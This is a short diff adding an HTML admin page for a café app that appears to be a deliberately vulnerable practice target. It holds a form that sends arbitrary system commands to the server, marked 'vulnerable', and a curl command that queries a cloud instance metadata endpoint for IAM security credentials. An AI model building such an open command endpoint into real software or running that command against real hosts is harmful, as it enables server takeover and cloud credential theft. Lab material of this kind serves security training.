@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>TropiJuice Café Admin</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <h1 class="title">Admin Panel</h1>
+  <p>Run system commands (vulnerable)</p>
+
+  <form action="/run" method="POST">
+    <input name="cmd" placeholder="Enter command">
+    <button type="submit">Execute</button>
+  </form>
+
+  <p>Try metadata attack:</p>
+  <code>
+    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+  </code>
+</body>
+</html>
